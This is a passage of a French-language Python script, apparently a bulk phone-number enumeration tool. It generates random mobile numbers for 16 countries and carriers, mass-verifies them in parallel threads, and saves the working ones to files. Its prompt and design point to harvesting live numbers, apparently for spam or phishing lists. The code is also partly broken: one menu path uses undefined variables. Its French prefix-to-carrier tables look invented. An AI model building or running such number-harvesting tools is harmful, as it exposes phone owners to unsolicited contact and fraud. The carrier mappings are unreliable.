                return f"Fixe: {fixed_prefixes[prefix]}"
                
    elif region == "BE" and number.startswith("+32"):
        local_number = "0" + number[3:]
        prefixes = belgium_prefixes
        fixed_prefixes = belgium_fixed_prefixes
    elif region == "DE" and number.startswith("+49"):
        local_number = "0" + number[3:]
        prefixes = german_prefixes
        fixed_prefixes = german_fixed_prefixes
    elif region == "ES" and number.startswith("+34"):
        local_number = number[3:]  # En Espagne, pas de 0 initial
        prefixes = spain_prefixes
        fixed_prefixes = spain_fixed_prefixes
    elif region == "PT" and number.startswith("+351"):
        local_number = number[4:]  # Au Portugal, pas de 0 initial
        prefixes = portugal_prefixes
        fixed_prefixes = portugal_fixed_prefixes
    elif region == "CH" and number.startswith("+41"):
        local_number = "0" + number[3:]
        prefixes = swiss_prefixes
        fixed_prefixes = swiss_fixed_prefixes
    elif region == "KE" and number.startswith("+254"):
        local_number = "0" + number[4:]
        prefixes = kenya_prefixes
        fixed_prefixes = kenya_fixed_prefixes
    elif region == "ZA" and number.startswith("+27"):
        local_number = "0" + number[3:]
        prefixes = south_africa_prefixes
        fixed_prefixes = south_africa_fixed_prefixes
    elif region == "NL" and number.startswith("+31"):
        local_number = "0" + number[3:]
        prefixes = netherlands_prefixes
        fixed_prefixes = netherlands_fixed_prefixes
    else:
        return None
    
    # Recherche du préfixe le plus long qui correspond pour les mobiles
    for prefix in sorted(prefixes.keys(), key=lambda k: (-len(k), k)):
        if local_number.startswith(prefix):
            return prefixes[prefix]
    
    # Si aucun préfixe mobile ne correspond, essayer avec les préfixes fixes
    for prefix in sorted(fixed_prefixes.keys(), key=lambda k: (-len(k), k)):
        if local_number.startswith(prefix):
            return f"Fixe: {fixed_prefixes[prefix]}"
    
    return None

def generate_french_number(operator):
    """Génère un numéro français pour un opérateur spécifique"""
    if operator == "Orange":
        prefixes = [
            "0601", "0602", "0603", "0604", 
            "0605", "0606", "0607", "0608", 
            "0609", "0610", "0611", "0612", 
            "0613", "0614", "0700", "0701", 
            "0702", "0703", "0704"
        ]
    elif operator == "SFR":
        prefixes = [
            "0615", "0616", "0617", "0618", 
            "0619", "0620", "0621", "0622", 
            "0623", "0624", "0705", "0706", 
            "0707", "0708", "0709"
        ]
    elif operator == "Bouygues Telecom":
        prefixes = [
            "0625", "0626", "0627", "0628", 
            "0629", "0630", "0631", "0632", 
            "0633", "0634", "0710", "0711", 
            "0712", "0713", "0714"
        ]
    elif operator == "Free Mobile":
        prefixes = [
            "0635", "0636", "0637", "0638", 
            "0639", "0640", "0641", "0642", 
            "0643", "0644", "0715", "0716", 
            "0717", "0718", "0719"
        ]
    else:
        return None
        
    # Choisir un préfixe aléatoire
    prefix = random.choice(prefixes)
    
    # Calculer le nombre de chiffres restants à générer
    remaining_digits = 10 - len(prefix)  # Format français: 10 chiffres au total
    
    # Générer les chiffres restants
    suffix = ''.join(str(random.randint(0, 9)) for _ in range(remaining_digits))
    
    # Former le numéro local
    local_number = prefix + suffix
    
    # Convertir en format international
    international_number = "+33" + local_number[1:]  # Enlever le 0 initial et ajouter +33
    
    return international_number

def main():
    try:
        choice = input("@hasbateur2cc > ")
        
        if choice == "1":
            print("Choisissez le pays pour la génération des numéros :")
            print("[1] Guadeloupe")
            print("[2] Guyane Française")
            print("[3] Martinique")
            print("[4] Réunion")
            print("[5] Mayotte")
            print("[6] Saint-Martin")
            print("[7] Saint-Barthélemy")
            print("[8] Belgique")
            print("[9] France")
            print("[10] Afrique du Sud")
            print("[11] Espagne")
            print("[12] Portugal")
            print("[13] Allemagne")
            print("[14] Suisse")
            print("[15] Kenya")
            print("[16] Pays-Bas")
            
            country_choice = input("Votre choix : ")
            try:
                country_choice = int(country_choice)
            except ValueError:
                print("Choix invalide, utilisation de la France par défaut.")
                country_choice = 9
                
            if country_choice == 1:
                prefix = "+590"
                region = "GP"
            elif country_choice == 2:
                prefix = "+594"
                region = "GF"
            elif country_choice == 3:
                prefix = "+596"
                region = "MQ"
            elif country_choice == 4:
                prefix = "+262"
                region = "RE"
            elif country_choice == 5:
                prefix = "+262"
                region = "YT"
            elif country_choice == 6:
                prefix = "+590"
                region = "MF"
            elif country_choice == 7:
                prefix = "+590"
                region = "BL"
            elif country_choice == 8:
                prefix = "+32"
                region = "BE"
            elif country_choice == 9:
                prefix = "+33"
                region = "FR"
            elif country_choice == 10:
                prefix = "+27"
                region = "ZA"
            elif country_choice == 11:
                prefix = "+34"
                region = "ES"
            elif country_choice == 12:
                prefix = "+351"
                region = "PT"
            elif country_choice == 13:
                prefix = "+49"
                region = "DE"
            elif country_choice == 14:
                prefix = "+41"
                region = "CH"
            elif country_choice == 15:
                prefix = "+254"
                region = "KE"
            elif country_choice == 16:
                prefix = "+31"
                region = "NL"
            else:
                print("Choix invalide, utilisation de la France par défaut.")
                prefix = "+33"
                region = "FR"
            
            # Option pour choisir un opérateur spécifique
            specific_operator = None
            use_specific_operator = input("Voulez-vous générer des numéros pour un opérateur spécifique ? (oui/non) : ").strip().lower()
            
            if use_specific_operator == "oui":
                # Récupérer la liste des opérateurs disponibles pour le pays
                if region == "FR":
                    operator_list = sorted(set(france_prefixes.values()))
                elif region == "BE":
                    operator_list = sorted(set(belgium_prefixes.values()))
                elif region == "DE":
                    operator_list = sorted(set(german_prefixes.values()))
                elif region == "ES":
                    operator_list = sorted(set(spain_prefixes.values()))
                elif region == "PT":
                    operator_list = sorted(set(portugal_prefixes.values()))
                elif region == "CH":
                    operator_list = sorted(set(swiss_prefixes.values()))
                elif region == "KE":
                    operator_list = sorted(set(kenya_prefixes.values()))
                elif region == "ZA":
                    operator_list = sorted(set(south_africa_prefixes.values()))
                elif region == "NL":
                    operator_list = sorted(set(netherlands_prefixes.values()))
                else:
                    operator_list = []
                
                if operator_list:
                    print("Opérateurs disponibles :")
                    for idx, operator in enumerate(operator_list, 1):
                        print(f"  {idx}. {operator}")
                    
                    op_choice = input("Choisissez un opérateur (numéro) : ")
                    try:
                        op_idx = int(op_choice) - 1
                        if 0 <= op_idx < len(operator_list):
                            specific_operator = operator_list[op_idx]
                            print(f"Génération de numéros pour l'opérateur: {specific_operator}")
                        else:
                            print("Choix invalide, génération pour tous les opérateurs.")
                    except ValueError:
                        print("Entrée invalide, génération pour tous les opérateurs.")
                else:
                    print("Pas d'opérateurs spécifiques disponibles pour ce pays.")
            
            # Demander le nombre de numéros à générer
            try:
                target = int(input("Nombre de numéros validés requis > "))
                if target <= 0:
                    raise ValueError("Le nombre doit être positif")
            except ValueError:
                print("Valeur invalide, utilisation de 100 par défaut.")
                target = 100
            
            # Demander le timeout initial
            try:
                timeout_value = float(input("Timeout pour les requêtes (secondes, défaut 1.0) > "))
                if timeout_value <= 0:
                    raise ValueError("Le timeout doit être positif")
            except ValueError:
                print("Valeur invalide, utilisation de 1.0 seconde par défaut.")
                timeout_value = 1.0
                
            valid_count = 0
            total_attempts = 0
            batch_size = min(1000, target * 2)  # Taille de batch optimisée
            
            # Réinitialiser les statistiques
            with stats_lock:
                stats["checked"] = 0
                stats["valid"] = 0
                stats["invalid"] = 0
                stats["errors"] = 0
                stats["start_time"] = time.time()
            
            cpu_cores = os.cpu_count()
            max_workers_count = min(cpu_cores * 4, 100)  # Nombre optimal de workers
            print(f"\n[INFO] Utilisation de {max_workers_count} workers en parallèle")
            
            # Créer les fichiers de sortie s'ils n'existent pas
            if specific_operator:
                filename = f"{specific_operator}_{region}.txt"
                with open(filename, "w") as f:
                    f.write("")  # Vider le fichier ou le créer s'il n'existe pas
            
            while valid_count < target:
                print(f"\nGénération d'un batch de {batch_size} numéros...")
                
                # Générer le batch
                batch = []
                
                if specific_operator:
                    print(f"Génération spécifique pour l'opérateur {specific_operator}...")
                    
                    # Cas spécial pour la France avec fonction dédiée
                    if region == "FR":
                        print(f"Utilisation de la génération spécifique pour les opérateurs français")
                        batch_candidates = []
                        candidates_needed = min(2000, (target - valid_count) * 2)
                        
                        # Génération directe avec la fonction dédiée
                        for _ in range(candidates_needed):
                            candidate = generate_french_number(specific_operator)
                            if candidate:
                                # Vérification additionnelle
                                try:
                                    phone_obj = phonenumbers.parse(candidate, region)
                                    if phonenumbers.is_valid_number(phone_obj):
                                        batch_candidates.append(candidate)
                                        if len(batch_candidates) % 20 == 0:
                                            print(f"Générés: {len(batch_candidates)}/{candidates_needed} pour {specific_operator}")
                                except Exception:
                                    pass  # Ignorer les erreurs de parsing
                                    
                        batch = batch_candidates[:batch_size]
                        print(f"Vérification de {len(batch)} numéros français pour {specific_operator}...")
                    
                    # Méthode générique pour les autres pays
                    else:
                        # Générer un nombre suffisant pour couvrir le taux de succès attendu
                        batch_candidates = []
                        candidates_needed = min(5000, (target - valid_count) * 5)
                        print(f"Génération de {candidates_needed} candidats pour obtenir {target - valid_count} numéros valides...")
                        
                        # Variables pour éviter une boucle infinie
                        gen_attempts = 0
                        max_gen_attempts = 50000  # Limite maximale de tentatives
                        start_time = time.time()
                        timeout = 60  # Timeout en secondes
                        
                        # Générer des candidats avec l'opérateur spécifique
                        while len(batch_candidates) < candidates_needed and gen_attempts < max_gen_attempts:
                            # Vérifier si on a dépassé le timeout
                            if time.time() - start_time > timeout:
                                print(f"Timeout atteint après {gen_attempts} tentatives. Utilisation des {len(batch_candidates)} candidats générés.")
                                break
                                
                            candidate = gen_candidate(prefix, region)
                            gen_attempts += 1
                            
                            # Afficher la progression de temps en temps
                            if gen_attempts % 1000 == 0:
                                print(f"Tentatives: {gen_attempts}, Candidats trouvés: {len(batch_candidates)}")
                                
                            if candidate:
                                operator = identify_operator(candidate, region)
                                if operator == specific_operator:
                                    batch_candidates.append(candidate)
                                    if len(batch_candidates) % 50 == 0:
                                        print(f"Progrès: {len(batch_candidates)}/{candidates_needed} candidats générés pour {specific_operator}")
                        
                        if len(batch_candidates) == 0:
                            print(f"Impossible de générer des numéros pour l'opérateur {specific_operator}. Vérifiez les préfixes.")
                            print("Passage à la génération standard...")
                            batch = gen_candidate_batch(prefix, region, batch_size)
                        else:
                            batch = batch_candidates[:batch_size]
                            print(f"Vérification de {len(batch)} numéros pour {specific_operator}...")
                else:
                    # Génération standard avec vérification préalable de validité
                    batch = gen_candidate_batch(prefix, region, batch_size)
                    print(f"Vérification de {len(batch)} numéros...")
                
                if not batch:
                    print("Erreur: Impossible de générer des numéros valides. Vérifiez les paramètres.")
                    return
                
                # Utiliser ThreadPoolExecutor pour une meilleure performance
                max_workers = min(max_workers_count, len(batch))
                chunk_size = max(5, min(100, len(batch) // max(max_workers, 1)))
                
                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    # Créer une fonction partielle pour passer la région et le timeout
                    fun_action_with_params = partial(fun_action, region=region, initial_timeout=timeout_value)
                    
                    # Division en chunks plus petits pour un meilleur contrôle
                    chunks = [batch[i:i+chunk_size] for i in range(0, len(batch), chunk_size)]
                    
                    batch_valid_count = 0  # Compteur pour ce batch
                    
                    # Vérifier par chunks
                    for chunk_idx, chunk in enumerate(chunks):
                        print(f"Vérification du chunk {chunk_idx+1}/{len(chunks)} ({len(chunk)} numéros)")
                        
                        # Soumettre les tâches
                        futures = {executor.submit(fun_action_with_params, num): num for num in chunk}
                        
                        # Traiter les résultats au fur et à mesure
                        for future in as_completed(futures):
                            num = futures[future]
                            total_attempts += 1
                            try:
                                result = future.result()
                                if result:
                                    batch_valid_count += 1
                                    valid_count += 1
                                    # Afficher un compteur de progression
                                    if valid_count % 5 == 0 or valid_count == target:
                                        operator_info = identify_operator(num, region) or "Opérateur inconnu"
                                        print(f"[PROGRESSION] {valid_count}/{target} numéros validés ({operator_info}) ({(valid_count/target*100):.1f}%)")
                                
                                if valid_count >= target:
                                    # Annuler les tâches restantes
                                    for f in futures:
                                        if not f.done():
                                            f.cancel()
                                    break
                            except Exception as exc:
                                with stats_lock:
                                    stats["errors"] += 1
                                logging.error(f"Erreur lors de la vérification de {num}: {exc}")
                        
                        # Si on a atteint la cible, sortir de la boucle des chunks
                        if valid_count >= target:
                            break
                    
                    # Calculer le taux de réussite de ce batch
                    batch_success_rate = batch_valid_count / len(batch) if batch else 0
                    print(f"Taux de réussite du batch: {batch_success_rate:.2%}")
                
                # Afficher les statistiques de performance
                elapsed = time.time() - stats["start_time"]
                speed = total_attempts / max(elapsed, 0.001)
                print(f"\nBatch terminé: {valid_count}/{target} validés après {total_attempts} vérifications")
                print(f"Vitesse moyenne: {speed:.2f} numéros/seconde")
                
                # Ajuster la taille du prochain batch en fonction du taux de réussite
                if batch_success_rate > 0:
                    remaining = target - valid_count
                    # Estimer combien de numéros il faut encore vérifier
                    estimated_needed = int(remaining / batch_success_rate * 1.2)  # Ajouter 20% de marge
                    batch_size = min(estimated_needed, 2000)  # Limiter à 2000 max
                    print(f"Taille du prochain batch ajustée à {batch_size} basée sur le taux de réussite")
                else:
                    # Si aucun numéro valide, augmenter la taille du batch
                    batch_size = min(batch_size * 2, 3000)
                    print(f"Aucun numéro valide dans ce batch. Augmentation de la taille à {batch_size}")
            
            print(f"\nRécapitulatif: {valid_count} numéros validés après {total_attempts} numéros générés.")
            if total_attempts > 0:
                print(f"Taux de réussite: {(valid_count/total_attempts*100):.2f}%")
            print(f"Temps total: {(time.time() - stats['start_time']):.2f} secondes")
                
            # Continuer ou redémarrer
            restart = input("\nVoulez-vous générer d'autres numéros ? (oui/non): ").strip().lower()
            if restart == "oui":
                main()
        
        elif choice == "2":
            file_path = input("Chemin du fichier à vérifier > ")
            if not file_path or not os.path.exists(file_path):
                print("Fichier introuvable.")
                return
            
            print("Choisissez la région pour la vérification (pour identification de l'opérateur) :")
            print("[1] Guadeloupe")
            print("[2] Guyane Française")
            print("[3] Martinique")
            print("[4] Réunion")
            print("[5] Mayotte")
            print("[6] Saint-Martin")
            print("[7] Saint-Barthélemy")
            print("[8] Belgique")
            print("[9] France")
            print("[10] Afrique du Sud")
            print("[11] Espagne")
            print("[12] Portugal")
            print("[13] Allemagne")
            print("[14] Suisse")
            print("[15] Kenya")
            print("[16] Pays-Bas")
            print("[0] Auto-détection (par défaut)")
            
            region_choice = input("Votre choix (0-16): ")
            file_region = None
            
            try:
                region_choice = int(region_choice)
            except ValueError:
                region_choice = 0  # Auto-détection par défaut
                
            if region_choice == 1:
                file_region = "GP"
            elif region_choice == 2:
                file_region = "GF"
            elif region_choice == 3:
                file_region = "MQ"
            elif region_choice == 4:
                file_region = "RE"
            elif region_choice == 5:
                file_region = "YT"
            elif region_choice == 6:
                file_region = "MF"
            elif region_choice == 7:
                file_region = "BL"
            elif region_choice == 8:
                file_region = "BE"
            elif region_choice == 9:
                file_region = "FR"
            elif region_choice == 10:
                file_region = "ZA"
            elif region_choice == 11:
                file_region = "ES"
            elif region_choice == 12:
                file_region = "PT"
            elif region_choice == 13:
                file_region = "DE"
            elif region_choice == 14:
                file_region = "CH"
            elif region_choice == 15:
                file_region = "KE"
            elif region_choice == 16:
                file_region = "NL"
            
            # Option pour afficher les opérateurs
            show_operators = input("Voulez-vous afficher les informations d'opérateur pour les numéros ? (oui/non): ").strip().lower()
            display_operators = (show_operators == "oui")
            
            if display_operators:
                print("Les informations d'opérateur seront affichées pour chaque numéro.")
            
            # Ajouter l'information d'opérateur si demandée
            if display_operators:
                original_fun_action = fun_action
                
                def fun_action_with_operator_info(num, region=None, *args, **kwargs):
                    operator = identify_operator(num, region)
                    operator_info = f" ({operator})" if operator else ""
                    result = original_fun_action(num, region, *args, **kwargs)
                    return result
                
                # Remplacer temporairement la fonction
                globals()["fun_action"] = fun_action_with_operator_info
            
            watch_file(file_path, max_time, batch_size, file_region)
            
            # Restaurer la fonction originale si modifiée
            if display_operators:
                globals()["fun_action"] = original_fun_action
        
        elif choice == "3":
            file_path = input("Fichier à vérifier: ")
            if not os.path.exists(file_path):
                print(f"Le fichier {file_path} n'existe pas.")
                return
                
            max_time_input = input("Temps maximum de vérification en secondes (laisser vide pour illimité): ")
            max_time = None
            if max_time_input.strip():
                try:
                    max_time = int(max_time_input)
                    if max_time <= 0:
                        print("Temps invalide, surveillance illimitée par défaut.")
                        max_time = None
                except ValueError:
                    print("Valeur invalide, surveillance illimitée par défaut.")
                    
            batch_size_input = input("Nombre de numéros à vérifier par lot (défaut: 100): ")
            batch_size = 100
            if batch_size_input.strip():
                try:
                    batch_size = int(batch_size_input)
                    if batch_size <= 0:
                        print("Taille de lot invalide, utilisation de 100 par défaut.")
                        batch_size = 100
                except ValueError:
                    print("Valeur invalide, utilisation de 100 par défaut.")
                    
            # Demander la région pour la vérification
            print("\nChoisissez la région pour la vérification:")
            print("[1] Guadeloupe")
            print("[2] Guyane")
            print("[3] Martinique")
            print("[4] Réunion")
            print("[5] Mayotte")
            print("[6] Saint-Martin")
            print("[7] Saint-Barthélemy")
            print("[8] Belgique")
            print("[9] France")
            print("[10] Afrique du Sud")
            print("[11] Espagne")
            print("[12] Portugal")
            print("[13] Allemagne")
            print("[14] Suisse")
            print("[15] Kenya")
            print("[16] Pays-Bas")
            print("[0] Auto-détection (par défaut)")
            
            region_choice = input("Votre choix (0-16): ")
            file_region = None
            
            try:
                region_choice = int(region_choice)
            except ValueError:
                print("Choix invalide, utilisation de l'auto-détection.")
                region_choice = 0
                
            if region_choice == 1:
                file_region = "GP"
            elif region_choice == 2:
                file_region = "GF"
            elif region_choice == 3:
                file_region = "MQ"
            elif region_choice == 4:
                file_region = "RE"
            elif region_choice == 5:
                file_region = "YT"
            elif region_choice == 6:
                file_region = "MF"
            elif region_choice == 7:
                file_region = "BL"
            elif region_choice == 8:
                file_region = "BE"
            elif region_choice == 9:
                file_region = "FR"
            elif region_choice == 10:
                file_region = "ZA"
            elif region_choice == 11:
                file_region = "ES"
            elif region_choice == 12:
                file_region = "PT"
            elif region_choice == 13:
                file_region = "DE"
            elif region_choice == 14:
                file_region = "CH"
            elif region_choice == 15:
                file_region = "KE"
            elif region_choice == 16:
                file_region = "NL"
            
            # Option pour afficher les opérateurs
            show_operators = input("Voulez-vous afficher les informations d'opérateur pour les numéros ? (oui/non): ").strip().lower()
            display_operators = (show_operators == "oui")
            
            if display_operators:
                print("Les informations d'opérateur seront affichées pour chaque numéro.")
            
            # Ajouter l'information d'opérateur si demandée
            if display_operators:
                original_fun_action = fun_action
                
                def fun_action_with_operator_info(num, region=None, *args, **kwargs):
                    operator = identify_operator(num, region)
                    operator_info = f" ({operator})" if operator else ""
                    result = original_fun_action(num, region, *args, **kwargs)
                    return result
                
                # Remplacer temporairement la fonction
                globals()["fun_action"] = fun_action_with_operator_info
            
            watch_file(file_path, max_time, batch_size, file_region)
            
            # Restaurer la fonction originale si modifiée
            if display_operators:
                globals()["fun_action"] = original_fun_action
        
        else:
            print("Choix invalide")
            main()
            
    except KeyboardInterrupt:
        print("\nProgramme interrompu par l'utilisateur")
    except Exception as e:
        logging.error("Erreur non gérée dans la fonction principale", exc_info=True)
        print(f"Une erreur inattendue s'est produite: {str(e)}")
        print("Consultez le fichier error.log pour plus de détails")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgramme interrompu par l'utilisateur")
    except Exception as e:
        logging.error("Erreur critique", exc_info=True)
        print(f"Erreur critique: {str(e)}")
        print("Consultez le fichier error.log pour plus de détails")